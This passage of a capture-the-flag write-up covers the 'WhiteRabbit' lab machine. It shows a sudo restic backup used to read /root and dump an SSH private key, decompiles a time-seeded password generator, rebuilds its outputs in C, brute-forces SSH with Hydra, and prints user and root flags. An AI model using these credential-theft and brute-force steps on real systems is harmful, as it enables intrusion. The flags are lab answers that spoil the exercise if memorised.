  forget        Remove snapshots from the repository
  generate      Generate manual pages and auto-completion files (bash, fish, zsh, powershell)
  help          Help about any command
  init          Initialize a new repository
  key           Manage keys (passwords)
  list          List objects in the repository
  ls            List files in a snapshot
  migrate       Apply migrations
  mount         Mount the repository
  prune         Remove unneeded data from the repository
  recover       Recover data from the repository not referenced by snapshots
  repair        Repair the repository
  restore       Extract the data from a snapshot
  rewrite       Rewrite snapshots to exclude unwanted files
  snapshots     List all snapshots
  stats         Scan the repository and show basic statistics
  tag           Modify tags on snapshots
  unlock        Remove locks other processes created
  version       Print version information

Flags:
      --cacert file                file to load root certificates from (default: use system certificates or $RESTIC_CACERT)
      --cache-dir directory        set the cache directory. (default: use system default cache directory)
      --cleanup-cache              auto remove old cache directories
      --compression mode           compression mode (only available for repository format version 2), one of (auto|off|max) (default: $RESTIC_COMPRESSION) (default auto)
  -h, --help                       help for restic
      --insecure-tls               skip TLS certificate verification when connecting to the repository (insecure)
      --json                       set output mode to JSON for commands that support it
      --key-hint key               key ID of key to try decrypting first (default: $RESTIC_KEY_HINT)
      --limit-download rate        limits downloads to a maximum rate in KiB/s. (default: unlimited)
      --limit-upload rate          limits uploads to a maximum rate in KiB/s. (default: unlimited)
      --no-cache                   do not use a local cache
      --no-extra-verify            skip additional verification of data before upload (see documentation)
      --no-lock                    do not lock the repository, this allows some operations on read-only repositories
  -o, --option key=value           set extended option (key=value, can be specified multiple times)
      --pack-size size             set target pack size in MiB, created pack files may be larger (default: $RESTIC_PACK_SIZE)
      --password-command command   shell command to obtain the repository password from (default: $RESTIC_PASSWORD_COMMAND)
  -p, --password-file file         file to read the repository password from (default: $RESTIC_PASSWORD_FILE)
  -q, --quiet                      do not output comprehensive progress report
  -r, --repo repository            repository to backup to or restore from (default: $RESTIC_REPOSITORY)
      --repository-file file       file to read the repository location from (default: $RESTIC_REPOSITORY_FILE)
      --retry-lock duration        retry to lock the repository if it is already locked, takes a value like 5m or 2h (default: no retries)
      --tls-client-cert file       path to a file containing PEM encoded TLS client certificate and private key (default: $RESTIC_TLS_CLIENT_CERT)
  -v, --verbose                    be verbose (specify multiple times or a level using --verbose=n, max level/times is 2)

Use "restic [command] --help" for more information about a command.
```

## Privilege Escalation to morpheus

### Abusing restic Snapshots

Our plan was to use the `snapshot option` of `restic` to `backup` the `/root` directory and `exfiltrate` whatever was in there.

```shell
bob@ebdce80611e9:~$ mkdir -p /tmp/privesc
```

```shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic -r /tmp/privesc init
enter password for new repository: 
enter password again: 
created restic repository 6ee2a24ca0 at /tmp/privesc

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

| Password |
| -------- |
| foobar   |

```shell
bob@ebdce80611e9:~$ export RESTIC_PASSWORD='foobar'
```

```shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic -r /tmp/privesc backup /root
enter password for repository: 
repository 6ee2a24c opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files


Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.600 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot 2396713e saved
```

While in the process we saw that the `/root` directory contained another `SSH key pair` for a user called `morpheus`. Not only that we got a new `username` we also hopped on the boxes theme now.

```shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic -r /tmp/privesc ls latest
enter password for repository: 
repository 6ee2a24c opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot 2396713e of [/root] filtered by [] at 2025-04-06 07:04:57.69104098 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

| Username |
| -------- |
| morpheus |

We verified the `snapshot` we previously took and then `dumped` the content of the `SSH key` in `/root/morpheus`.

```shell
bob@ebdce80611e9:~$ sudo restic -r /tmp/privesc snapshots
enter password for repository: 
repository 6ee2a24c opened (version 2, compression level auto)
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
2396713e  2025-04-06 07:04:57  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots
```

```shell
bob@ebdce80611e9:~$ sudo restic -r /tmp/privesc dump latest /root/morpheus
enter password for repository: 
repository 6ee2a24c opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

With the `SSH key` and the correct permission set we were able to `escalate` our `privileges` to `morpheus`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat morpheus_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ chmod 600 morpheus_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ ssh -i morpheus_id_rsa morpheus@10.129.234.57
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Apr 6 07:09:24 2025 from 10.10.14.97
morpheus@whiterabbit:~$
```

## user.txt

Finally we could grab the `user.txt` and move on.

```shell
morpheus@whiterabbit:~$ cat user.txt 
31736256642d0e09ddcc465915493c37
```

## Enumeration (morpheus)

Within the session of `morpheus` we finally were able to `enumerate` the actual box and not only the `Docker container`.

```shell
morpheus@whiterabbit:~$ id
uid=1001(morpheus) gid=1001(morpheus) groups=1001(morpheus),100(users)
```

Obviously we found a new user called `neo` which was probably our next step in `privilege escalation` to get `root` at some point.

```shell
morpheus@whiterabbit:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
neo:x:1000:1000:Neo:/home/neo:/bin/bash
caddy:x:999:989:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
morpheus:x:1001:1001:Morpheus,,,:/home/morpheus:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
_laurel:x:996:988::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| neo      |

Next logical step was to check `sudo capabilities` again but this time this was a dead end.

```shell
morpheus@whiterabbit:~$ sudo -l
[sudo] password for morpheus: 
sudo: a password is required
```

However we found a directory called `neo-password-generator` within `/opt` with a corresponding `binary` in it.

```shell
morpheus@whiterabbit:~$ ls -la /opt
total 20
drwxr-xr-x  5 root root 4096 Aug 30  2024 .
drwxr-xr-x 22 root root 4096 Mar 24 13:42 ..
drwx--x--x  4 root root 4096 Aug 27  2024 containerd
drwxr-x--- 10 root root 4096 Sep 16  2024 docker
drwxr-xr-x  2 root root 4096 Aug 30  2024 neo-password-generator
```

```shell
morpheus@whiterabbit:/opt/neo-password-generator$ ls -la
total 24
drwxr-xr-x 2 root root  4096 Aug 30  2024 .
drwxr-xr-x 5 root root  4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 15656 Aug 30  2024 neo-password-generator
```

A quick check using `strings` showed some stuff we expected from a `password generator`.

```shell
morpheus@whiterabbit:/opt/neo-password-generator$ strings neo-password-generator 
/lib64/ld-linux-x86-64.so.2
puts
__stack_chk_fail
gettimeofday
__libc_start_main
srand
__cxa_finalize
libc.so.6
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u3UH
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
;*3$"
GCC: (GNU) 14.2.1 20240805
main.c
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
__stack_chk_fail@GLIBC_2.4
gettimeofday@GLIBC_2.2.5
srand@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
generate_password
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

When we fired it up it just generated a `random password`.

```shell
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
2hRH03bzpBleNA7CzMxa
```

For further investigation we `downloaded` the `binary` via `scp`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ scp -i morpheus_id_rsa morpheus@10.129.234.57:/opt/neo-password-generator/neo-password-generator .
neo-password-generator
```

Since `file` was not present on the box we checked it locally before we started `reverse engineering` it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ file neo-password-generator 
neo-password-generator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=479371f0c8046cb87ba4b6c3af5bc821a46d5871, for GNU/Linux 4.4.0, not stripped
```

## Reverse Engineering neo-password-generator

### Main Function

We threw the `binary` into `Ghidra` and started looking at the `main function`.

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password((int)local_28.tv_sec * 1000 + (int)(local_28.tv_usec / 1000));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}


```

![](images/2025-04-06_10-12_neo_password_generator_decompiled.png)

Then we dissected it piece by piece in order to figure out the next step and what to do with this binary. 

```c
undefined8 main(void)
```

- Classic `int main(void)` signature, Ghidra just used `undefined8` due to 64-bit ABI return types.

### Local Variables

```c
timeval local_28;
long local_10;
```

- `local_28` → stored the result of `gettimeofday()`
- `local_10` → stack canary to detect stack smashing (standard stack protector)

### Timestamp-based Seed

```c
gettimeofday(&local_28, (__timezone_ptr_t)0x0);
```

- Grabbed current time with microsecond precision.

```c
generate_password((int)local_28.tv_sec * 1000 + (int)(local_28.tv_usec / 1000));
```

- Combined the seconds and milliseconds into a single integer:
    - `tv_sec` (seconds since epoch)
    - `tv_usec / 1000` (microseconds → milliseconds)

This **composite seed value** was passed to the RNG seed in `generate_password()`, ensuring time-based deterministic output.

### Stack Canary Check

```c
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
}
```

- Classic stack canary — ensured stack wasn't tampered with.
- Nothing to worry about here unless we would have tried to exploit the binary.

### Conclusion

Based on the analysis of the code, we knew that the password generation was based on the system time (milliseconds since the epoch), and it used this time as a seed for the rand() function to generate a random password.

Since the password was generated from a predictable system time, we could generate potential passwords by iterating over a range of time values and generating passwords for each timestamp.

## Wordlist Generator

To make use of this newly gained knowledge we build our own `custom password generator` which generated us a list of about `1000 passwords` as preparation for the next step.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat wordlist_generator.c 
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    // Define the character set for the password (letters and numbers)
    char cs[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char pwd[21];  // Array to store the generated password (20 characters + null terminator)

    // Set the date and time (2024-08-30 14:40:42)
    struct tm tm = { .tm_year = 2024 - 1900, .tm_mon = 8 - 1, .tm_mday = 30, .tm_hour = 14, .tm_min = 40, .tm_sec = 42 };
    // Convert the time to time_t format (UTC time)
    time_t t = timegm(&tm);

    // Loop to generate 1000 passwords
    for (int ms = 0; ms < 1000; ms++) {
        // Set the random seed using the time in milliseconds (t * 1000 + ms)
        srand(t * 1000 + ms);

        // Generate a 20-character password using the character set
        for (int i = 0; i < 20; i++) {
            pwd[i] = cs[rand() % 62];  // Pick a random character from the set
        }
        pwd[20] = '\0';  // Null-terminate the string to make it a valid C string
        printf("%s\n", pwd);
    }
    return 0;
}
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ gcc wordlist_generator.c -o wordlist_generator
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ ./wordlist_generator > wordlist.txt
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat wordlist.txt
L7Qf2aFEohexxuk07tEw
hN6DEuEFtQ5LZX8uxw9r
lWL7jrjJTC54qDojrCvV
<--- CUT FOR BREVITY --->
pQO76ibL7VsStGAUFSqG
JHVaEItaKkewQSQoHXrI
HyHzVPdgv0ygEFHdp9ci
```

## Privilege Escalation to neo

### Brute Force using Hydra and custom Wordlist

All we now had to do is to use our `custom wordlist` in combination with `Hydra` and found the `password` for the user `neo` which enable us to `escalate` our `privileges` once again.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ hydra -l neo -P wordlist.txt 10.129.234.57 ssh -t 50
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-06 09:17:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 1000 login tries (l:1/p:1000), ~20 tries per task
[DATA] attacking ssh://whiterabbit.htb:22/
[STATUS] 448.00 tries/min, 448 tries in 00:01h, 586 to do in 00:02h, 16 active
[STATUS] 361.00 tries/min, 722 tries in 00:02h, 314 to do in 00:01h, 14 active
[STATUS] 315.67 tries/min, 947 tries in 00:03h, 91 to do in 00:01h, 12 active
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-06 09:20:22
```

| Username | Password             |
| -------- | -------------------- |
| neo      | WBSxhWgfnMiclrV4dqfj |

```shell
┌──(kali㉿kali)-[~]
└─$ ssh neo@10.129.234.57
neo@10.129.234.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Last login: Sun Apr 6 07:22:43 2025 from 10.10.14.97
```

## Enumeration (neo)

As `neo` the `enumeration` showed us that only one more step was necessary to gain access as `root` on the box because of the `sudo capability` which had set `(ALL : ALL) ALL` for `whiterabbit`.

```shell
neo@whiterabbit:~$ id
uid=1000(neo) gid=1000(neo) groups=1000(neo),27(sudo)
```

```shell
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

## Privilege Escalation to root

We executed one more command, grabbed the `root.txt` and ended the season with `pwning whiterabbit`.

```shell
neo@whiterabbit:~$ sudo su -
root@whiterabbit:~#
```

## root.txt

```shell
root@whiterabbit:~# cat root.txt 
c5c1ddc44f39c76658ada315a705fdf2
```
